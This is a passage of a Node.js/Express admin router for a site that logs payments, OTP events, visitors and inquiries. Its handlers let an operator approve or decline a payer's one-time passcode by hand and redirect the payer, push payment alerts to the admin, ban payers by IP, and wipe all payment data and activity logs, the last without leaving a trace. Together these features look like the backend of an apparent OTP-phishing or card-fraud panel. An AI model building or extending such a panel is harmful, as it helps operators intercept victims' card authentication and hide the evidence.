        await query('UPDATE payments SET otp_status = ?, redirect_to = ? WHERE sid = ?', ['approved', 'otp-approved', cleanSid]);
      } else {
        await query('UPDATE payments SET otp_status = ? WHERE sid = ?', [req.body.status, cleanSid]);
      }
      if (req.body.status === 'approved' || req.body.status === 'declined') {
        logActivity('payment_status', 'Payment status → ' + req.body.status + ' (sid: ' + cleanSid + ')', adminUser, ip, userAgent).catch(() => {});
        sendAdminAlert('💳 <b>Payment Status</b>\nSID: ' + cleanSid + '\nStatus: ' + req.body.status + '\nAdmin: ' + adminUser + '\nIP: ' + ip).catch(() => {});
      }
      return res.json({ ok: true });
    }
    if (act === 'save_setting') {
      const key = (req.body.key||'').replace(/[^a-z_]/g,'');
      if (!key) return res.json({ ok:false });
      await setSetting(key, req.body.value || '');
      return res.json({ ok: true });
    }
    if (act === 'delete_payment') {
      if (!cleanSid) return res.json({ ok:false });
      await query('DELETE FROM payments WHERE sid = ?', [cleanSid]);
      await query('DELETE FROM otp_events WHERE sid = ?', [cleanSid]);
      logActivity('payment_delete', 'Payment deleted (sid: ' + cleanSid + ')', adminUser, ip, userAgent).catch(() => {});
      sendAdminAlert('🗑️ <b>Payment Deleted</b>\nSID: ' + cleanSid + '\nAdmin: ' + adminUser + '\nIP: ' + ip).catch(() => {});
      return res.json({ ok: true });
    }
    if (act === 'ban_user') {
      if (!cleanSid) return res.json({ ok:false });
      const payment = await queryOne('SELECT ip FROM payments WHERE sid = ? LIMIT 1', [cleanSid]);
      if (!payment?.ip) return res.json({ ok:false, error:'IP not found for this payment' });
      const raw = await getSetting('banned_ips', '[]');
      let list = [];
      try { list = JSON.parse(raw); } catch {}
      if (!list.includes(payment.ip)) list.push(payment.ip);
      await setSetting('banned_ips', JSON.stringify(list));
      logActivity('ban_user', 'User banned IP: ' + payment.ip + ' (sid: ' + cleanSid + ')', adminUser, ip, userAgent).catch(() => {});
      return res.json({ ok: true, ip: payment.ip });
    }
    res.json({ ok:false, error:'Unknown action' });
  } catch (e) {
    res.json({ ok:false, error:e.message });
  }
});

// ─── Payment Comment ──────────────────────────────────────────────────────────
router.post('/payments/comment', requireAdmin, async (req, res) => {
  const { sid = '', comment = '' } = req.body;
  const cleanSid = (sid + '').replace(/[^a-f0-9-]/g, '');
  if (!cleanSid) return res.json({ ok: false, error: 'Invalid SID' });
  try {
    await query('UPDATE payments SET comment = ? WHERE sid = ?', [comment, cleanSid]);
    res.json({ ok: true });
  } catch (e) { res.json({ ok: false, error: e.message }); }
});

// ─── Activity Logs ───────────────────────────────────────────────────────────
router.get('/logs', requireAdmin, async (req, res) => {
  const search  = req.query.q || '';
  const action  = req.query.action || '';
  const page    = Math.max(1, parseInt(req.query.p) || 1);
  const perPage = 30;
  const offset  = (page - 1) * perPage;
  try {
    await ensureActivityLogsTable();
    let where = '1=1', params = [];
    if (search) {
      where += ' AND (description ILIKE ? OR admin_user ILIKE ? OR ip ILIKE ?)';
      params.push(...[`%${search}%`, `%${search}%`, `%${search}%`]);
    }
    if (action) { where += ' AND action = ?'; params.push(action); }
    const total      = await count(`SELECT COUNT(*) FROM activity_logs WHERE ${where}`, params);
    const logs       = await query(`SELECT * FROM activity_logs WHERE ${where} ORDER BY created_at DESC LIMIT ${perPage} OFFSET ${offset}`, params);
    const totalPages = Math.max(1, Math.ceil(total / perPage));
    res.render('admin/logs', { adminUser: req.session.adminUser, logs, total, totalPages, page, search, action, perPage });
  } catch (e) {
    res.render('admin/logs', { adminUser: req.session.adminUser, logs: [], total: 0, totalPages: 1, page: 1, search, action, perPage, dbError: e.message });
  }
});

// ─── Full Data Reset ──────────────────────────────────────────────────────────
router.post('/settings/reset', requireAdmin, async (req, res) => {
  try {
    await query('DELETE FROM otp_events', []);
    await query('DELETE FROM payments', []);
    await query('DELETE FROM inquiries', []);
    logActivity('settings_change', 'Data reset: payments and inquiries cleared', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
    res.json({ ok: true });
  } catch(e) { res.json({ ok: false, error: e.message }); }
});

// ─── Individual Reset Endpoints ───────────────────────────────────────────────
router.post('/reset/visitors', requireAdmin, async (req, res) => {
  try {
    await query('DELETE FROM visitors', []);
    logActivity('data_reset', 'Visitors reset', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
    res.json({ ok: true });
  } catch(e) { res.json({ ok: false, error: e.message }); }
});

router.post('/reset/payments', requireAdmin, async (req, res) => {
  try {
    await query('DELETE FROM otp_events', []);
    await query('DELETE FROM payments', []);
    logActivity('data_reset', 'Payments reset', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
    res.json({ ok: true });
  } catch(e) { res.json({ ok: false, error: e.message }); }
});

router.post('/reset/inquiries', requireAdmin, async (req, res) => {
  try {
    await query('DELETE FROM inquiries', []);
    logActivity('data_reset', 'Inquiries reset', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
    res.json({ ok: true });
  } catch(e) { res.json({ ok: false, error: e.message }); }
});

router.post('/reset/logs', requireAdmin, async (req, res) => {
  try {
    await query('DELETE FROM activity_logs', []);
    res.json({ ok: true });
  } catch(e) { res.json({ ok: false, error: e.message }); }
});

module.exports = router;
